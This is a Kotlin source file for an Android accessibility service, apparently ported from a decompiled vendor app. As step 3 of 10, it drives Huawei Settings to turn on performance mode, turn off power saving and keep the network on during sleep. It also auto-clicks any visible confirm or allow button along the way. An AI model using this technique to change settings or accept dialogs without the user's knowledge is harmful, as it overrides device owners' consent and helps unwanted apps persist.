package com.storm.safe.rock.service.modules.yw5xud.huawei

import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps
import com.storm.safe.rock.service.modules.yw5xud.common.BatteryEntryFinder
import kotlinx.coroutines.delay

/**
 * Step 3/10 -- Battery Settings (vendor m212165b2, L2050-2511).
 *
 * Navigates Settings -> Battery -> More Battery Settings, then enables
 * "Keep network connected when sleeping" switch.
 */
class HuaweiStep3BatterySettings(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: HuaweiSteps
) {
    companion object {
        private const val TAG = "HuaweiStep3BatterySettings"
    }

    @Suppress("UNUSED_PARAMETER")
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i(TAG, "[Step3/10] enter executeStep3BatterySettings")
        HuaweiStepLogger.phase(3, "电池设置开始", "vendor m212165b2 L2099", logs)

        if (HuaweiStepCompletionStore.isCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP3_OVERALL)) {
            HuaweiStepLogger.skip(3, "已完成 (STEP3_OVERALL 24h 内 mark)", logs)
            return
        }

        if (isStep3Completed()) {
            HuaweiStepLogger.skip(3, "SP network_on_sleep 已标记完成", logs)
            return
        }

        val maxOuterRetry = 2
        var outerAttempt = 1
        while (outerAttempt <= maxOuterRetry) {
            logs.add("[Step3/10] 第 $outerAttempt 次尝试 (vendor L2106)")

            val openFailed = try { ui.openSettings(); false } catch (e: Exception) {
                logs.add("[Step3/10] openSettings 异常: ${e.message}")
                true
            }
            if (openFailed) {
                logs.add("[Step3/10] 打开设置失败 (vendor L2114)")
                if (outerAttempt >= maxOuterRetry) {
                    logs.add("[Step3/10] 2次尝试均失败，标记完成并退出 (vendor L2116)")
                    return
                }
                delay(100L)
                outerAttempt++
                continue
            }

            logs.add("[Step3/10] 步骤2: 找电池 (vendor L2128)")
            val batteryFound = try { findAndClickBattery() } catch (e: Exception) {
                logs.add("[Step3/10] findAndClickBattery 异常: ${e.message}")
                false
            }
            if (!batteryFound) {
                logs.add("[Step3/10] 找电池失败，重新打开设置页 (vendor L2135)")
                if (outerAttempt >= maxOuterRetry) {
                    logs.add("[Step3/10] 2次找电池均失败，标记完成并退出")
                    return
                }
                try { ui.openSettings() } catch (_: Exception) { }
                delay(1500L)
                outerAttempt++
                continue
            }

            delay(800L)
            val onBatteryPage = try { isOnBatteryPage() } catch (_: Exception) { false }
            if (!onBatteryPage) {
                logs.add("[Step3/10] 未进入电池页面 (vendor L2154)")
                if (outerAttempt >= maxOuterRetry) {
                    logs.add("[Step3/10] 2次尝试均失败，标记完成并退出 (vendor L2156-2157)")
                    return
                }
                logs.add("[Step3/10] 重新整个流程（第 ${outerAttempt + 1} 次）(vendor L2160)")
                delay(100L)
                outerAttempt++
                continue
            }

            logs.add("[Step3/10] 步骤3: 处理性能模式和省电模式 (vendor L2170)")
            try { handlePerformanceAndPowerSaving() } catch (_: Exception) { }
            delay(100L)
            HuaweiStepLogger.probe(3, "phase", "entered-battery-page (not marking SP yet)")
            HuaweiStepLogger.phase(3, "滚动查找'更多电池设置'", "vendor L2181", logs)

            var innerAttempt = 1
            val maxInnerRetry = 2
            var innerDone = false
            while (innerAttempt <= maxInnerRetry && !innerDone) {
                logs.add("[Step3/10] 第 $innerAttempt 次尝试进入更多电池设置 (vendor L2185)")

                val moreBatteryFound = try {
                    scrollAndClickMoreBatterySettings()
                } catch (e: Exception) {
                    logs.add("[Step3/10] scrollAndClick 异常: ${e.message}")
                    false
                }

                if (!moreBatteryFound) {
                    logs.add("[Step3/10] 未进入更多电池设置，重新打开设置 (vendor L2200)")
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(100L)
                    val reOpenFailed = try { ui.openSettings(); false } catch (_: Exception) { true }
                    if (reOpenFailed) {
                        logs.add("[Step3/10] 重新打开设置失败")
                        innerAttempt++
                        continue
                    }
                    innerAttempt++
                    continue
                }

                delay(100L)
                val onMorePage = try { isOnMoreBatterySettingsPage() } catch (_: Exception) { false }
                if (onMorePage) {
                    HuaweiStepLogger.probe(3, "phase", "entered-more-battery-settings (not marking SP yet)")
                    HuaweiStepLogger.phase(3, "步骤5: 开启'休眠时始终保持网络连接'", "vendor L2239", logs)
                    val toggled = try { toggleNetworkSwitch() } catch (_: Exception) { false }
                    HuaweiStepLogger.probe(3, "toggleNetworkSwitch result", toggled)
                    delay(100L)
                    if (toggled) {
                        HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP3_NETWORK_ON_SLEEP)
                        HuaweiStepLogger.success(3, "电池设置已完成", "休眠网络保持开关已切换", successes)
                    } else {
                        val alreadyOn = try { verifyNetworkSwitchChecked() } catch (_: Exception) { false }
                        if (alreadyOn) {
                            HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP3_NETWORK_ON_SLEEP)
                            HuaweiStepLogger.probe(3, "toggleNetworkSwitch verify", "已处于目标状态 (isChecked=true), mark 完成")
                            successes.add("[Step3/10] 休眠保持网络已开启（verify 幂等）")
                        } else {
                            HuaweiStepLogger.warn(3, "toggleNetworkSwitch 未切换且 verify 未开启", "可能不在更多电池设置页", logs)
                        }
                    }
                    innerDone = true
                    break
                } else {
                    logs.add("[Step3/10] 未进入更多电池设置，重试 (vendor L2250)")
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(100L)
                    innerAttempt++
                }
            }

            if (!innerDone) {
                logs.add("[Step3/10] 无法进入更多电池设置，跳过 (vendor L2223)")
                if (outerAttempt >= maxOuterRetry) {
                    logs.add("[Step3/10] 2次尝试均失败，标记完成并退出 (vendor L2225)")
                    return
                }
                delay(100L)
                outerAttempt++
                continue
            }

            break
        }

        HuaweiStepLogger.phase(3, "流程结束", "vendor case 16 f55070a8", logs)

        val subkeysAllDone = HuaweiStepCompletionStore.isCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP3_PERFORMANCE_MODE)
            && HuaweiStepCompletionStore.isCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP3_POWER_SAVING)
            && HuaweiStepCompletionStore.isCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP3_NETWORK_ON_SLEEP)
        if (subkeysAllDone) {
            HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP3_OVERALL)
            HuaweiStepLogger.probe(3, "mark-step3-overall", "battery_completed (f55070a8) 已标记")
            logs.add("║ [Step3/10] STEP3_OVERALL marked")
        }
    }

    // ---- helpers ----

    private fun isStep3Completed(): Boolean =
        HuaweiStepCompletionStore.isCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP3_NETWORK_ON_SLEEP)

    private suspend fun findAndClickBattery(): Boolean {
        val svc = service ?: return false
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { return false } ?: return false
        val pkg = root.packageName?.toString() ?: ""
        if (pkg != "com.android.settings" && pkg != "com.huawei.settings" && pkg != "com.hihonor.settings") {
            HuaweiStepLogger.probe(3, "findAndClickBattery", "当前窗口非设置页面 (pkg=$pkg)，跳过")
            return false
        }
        val node = BatteryEntryFinder.find(root)
        if (node != null) {
            HuaweiStepLogger.probe(3, "findAndClickBattery matched (首屏)",
                (node.text ?: node.contentDescription ?: "").toString())
            return ui.click(node)
        }
        HuaweiStepLogger.probe(3, "findAndClickBattery", "首屏未找到，开始滚动查找 (max 3 scroll)")
        for (scrollAttempt in 1..3) {
            try {
                val scrollTarget = ui.query("[scrollable=true]")
                if (scrollTarget != null) {
                    scrollTarget.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                } else {
                    val s = service
                    if (s != null) {
                        val w = steps.getScreenWidthPx().toFloat()
                        val h = steps.getScreenHeightPx().toFloat()
                        val path = android.graphics.Path().apply {
                            moveTo(w * 0.5f, h * 0.7f)
                            lineTo(w * 0.5f, h * 0.3f)
                        }
                        val gesture = android.accessibilityservice.GestureDescription.Builder()
                            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 300L))
                            .build()
                        s.dispatchGesture(gesture, null, null)
                    }
                }
            } catch (_: Exception) { }
            delay(800L)
            val rootAfter = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: continue
            val node2 = BatteryEntryFinder.find(rootAfter)
            if (node2 != null) {
                HuaweiStepLogger.probe(3, "findAndClickBattery matched (scroll $scrollAttempt)",
                    (node2.text ?: node2.contentDescription ?: "").toString())
                return ui.click(node2)
            }
        }
        HuaweiStepLogger.probe(3, "findAndClickBattery", "3 次滚动后仍未找到")
        return false
    }

    private fun isOnBatteryPage(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        return HuaweiPageDetector().isOnBatteryPage(root)
    }

    private fun handlePerformanceAndPowerSaving() {
        val performanceToggled = ui.openSwitch("性能模式")
        val confirmKeywords = listOf("开启", "确定", "确认", "允许", "開啟", "確定", "確認", "允許")
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
        if (root != null) {
            for (kw in confirmKeywords) {
                val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
                if (nodes.isNullOrEmpty()) continue
                for (n in nodes) {
                    if (n.isVisibleToUser && n.isClickable) {
                        n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        break
                    }
                }
            }
        }
        if (performanceToggled) {
            HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP3_PERFORMANCE_MODE)
        }
        val powerSavingToggled = ui.closeSwitch("省电模式")
        if (powerSavingToggled) {
            HuaweiStepCompletionStore.markCompleted(steps.ctx, HuaweiStepCompletionStore.Keys.STEP3_POWER_SAVING)
        }
    }

    private fun scrollAndClickMoreBatterySettings(): Boolean {
        for (scroll in 0 until 3) {
            if (ui.clickSelector("[text=\"更多电池设置\"][visibleToUser=true]")) return true
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val scrollable = ui.query("[scrollable=true]")
                if (scrollable != null) {
                    scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                } else {
                    root.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                }
            }
        }
        return false
    }

    private fun isOnMoreBatterySettingsPage(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        return HuaweiPageDetector().isOnMoreBatterySettingsPage(root)
    }

    private fun toggleNetworkSwitch(): Boolean {
        return ui.openSwitch("休眠时始终保持网络连接")
    }

    private fun verifyNetworkSwitchChecked(): Boolean {
        val svc = service ?: return false
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val texts = listOf(
            "休眠时始终保持网络连接",
            "休眠时保持网络连接",
            "锁屏后始终保持网络连接",
            "Keep network connected when sleeping",
            "Always keep mobile data on"
        )
        for (text in texts) {
            val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (n in nodes) {
                if (!n.isVisibleToUser) continue
                val sw = ui.query("Switch[checkable=true]") ?: continue
                android.util.Log.d(TAG, "[Step3] verifyNetworkSwitchChecked '$text' isChecked=${sw.isChecked}")
                return sw.isChecked
            }
        }
        return false
    }
}
